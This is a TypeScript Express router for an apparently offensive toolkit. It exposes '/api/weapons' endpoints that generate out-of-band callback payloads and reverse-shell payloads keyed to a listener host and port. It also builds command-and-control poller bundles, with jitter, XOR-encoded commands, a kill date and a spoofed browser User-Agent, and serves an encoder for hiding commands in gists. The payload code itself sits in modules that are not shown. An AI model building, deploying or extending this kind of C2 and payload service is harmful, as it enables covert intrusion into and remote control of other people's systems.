import { Router } from "express";
import { buildAllEchoPayloads }   from "../lib/echoVault.js";
import { buildAllShadowPayloads } from "../lib/shadowForge.js";
import { buildAllVeilPayloads }   from "../lib/veilRunner.js";
import { KILL_CHAINS }            from "../lib/chainReactor.js";
import { buildC2PollerBundle, buildGistCommandEncoder } from "../lib/c2Poller.js";
import type { C2PollerConfig }    from "../lib/c2Poller.js";

const router = Router();

router.get("/api/weapons/echoes", (req, res) => {
  const cbUrl = String(req.query["cbUrl"]  ?? "http://oob.nexusforge.local");
  const token = String(req.query["token"]  ?? "NEXUSTOKEN");
  const proto = req.query["protocol"] as string | undefined;
  const os    = req.query["os"]       as string | undefined;

  let payloads = buildAllEchoPayloads(cbUrl, token);
  if (proto) payloads = payloads.filter(p => p.protocol === proto);
  if (os && os !== "all") payloads = payloads.filter(p => p.os === os || p.os === "any");

  res.json({ payloads, total: payloads.length });
});

router.get("/api/weapons/shadows", (req, res) => {
  const lhost = String(req.query["lhost"] ?? "127.0.0.1");
  const lport = String(req.query["lport"] ?? "4444");
  const os    = req.query["os"]  as string | undefined;
  const cat   = req.query["cat"] as string | undefined;

  let payloads = buildAllShadowPayloads(lhost, lport);
  if (os && os !== "all") payloads = payloads.filter(p => p.os === os || (p.os as string) === "any");
  if (cat) payloads = payloads.filter(p => p.category.toLowerCase().includes(cat.toLowerCase()));

  res.json({ payloads, total: payloads.length });
});

router.get("/api/weapons/veils", (req, res) => {
  const lhost = String(req.query["lhost"] ?? "127.0.0.1");
  const lport = String(req.query["lport"] ?? "4444");
  const os    = req.query["os"]    as string | undefined;
  const cat   = req.query["cat"]   as string | undefined;
  const phase = req.query["phase"] as string | undefined;

  let payloads = buildAllVeilPayloads(lhost, lport);
  if (os && os !== "all") payloads = payloads.filter(p => p.os === os || (p.os as string) === "any");
  if (cat)   payloads = payloads.filter(p => p.category.toLowerCase().includes(cat.toLowerCase()));
  if (phase) payloads = payloads.filter(p => p.phase === phase);

  res.json({ payloads, total: payloads.length });
});

router.get("/api/weapons/chains", (_req, res) => {
  res.json({
    chains: KILL_CHAINS.map(c => ({
      id:          c.id,
      name:        c.name,
      description: c.description,
      category:    c.category,
      severity:    c.severity,
      steps:       c.steps.length,
    })),
    total: KILL_CHAINS.length,
  });
});

router.post("/api/weapons/c2", (req, res) => {
  const b = req.body as Partial<C2PollerConfig>;
  if (!b.pollUrl) {
    res.status(400).json({ error: "pollUrl is required" });
    return;
  }
  const cfg: C2PollerConfig = {
    source:    (b.source as C2PollerConfig["source"]) ?? "url",
    pollUrl:   b.pollUrl,
    reportUrl: b.reportUrl,
    interval:  Number(b.interval ?? 60),
    jitter:    Number(b.jitter   ?? 30),
    engine:    (b.engine as C2PollerConfig["engine"]) ?? "bash",
    maxRuns:   Number(b.maxRuns  ?? 9999),
    xorKey:    Number(b.xorKey   ?? 0x4e),
    killDate:  b.killDate,
    userAgent: b.userAgent ?? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    os:        (b.os as C2PollerConfig["os"]) ?? "linux",
  };
  const payloads = buildC2PollerBundle(cfg);
  res.json({ payloads, total: payloads.length, config: cfg });
});

router.get("/api/weapons/c2/encode", (req, res) => {
  const cmd    = String(req.query["cmd"]    ?? "id");
  const xorKey = Number(req.query["xorKey"] ?? 0x4e);
  if (xorKey < 0 || xorKey > 255) {
    res.status(400).json({ error: "xorKey must be 0-255" });
    return;
  }
  const encoded = buildGistCommandEncoder(cmd, xorKey);
  res.json({ encoded, cmd, xorKey });
});

export default router;
